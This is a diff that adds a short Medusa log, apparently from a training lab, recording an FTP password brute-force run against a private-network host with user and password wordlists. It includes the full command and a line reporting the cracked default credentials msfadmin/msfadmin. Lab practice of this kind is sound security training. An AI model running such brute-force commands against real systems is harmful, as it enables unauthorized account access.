@@ -1,0 +1,4 @@
+# Medusa v.2.3 (2026-10-26 23:46:25)
+# medusa -h 192.168.1.106 -U /root/dio-cyber/wordlists/users.txt -P /root/dio-cyber/wordlists/passwords.txt -M ftp -O /root/dio-cyber/logs/medusa_ftp.log 
+2026-10-26 23:46:25 ACCOUNT FOUND: [ftp] Host: 192.168.1.106 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-10-26 23:47:14).
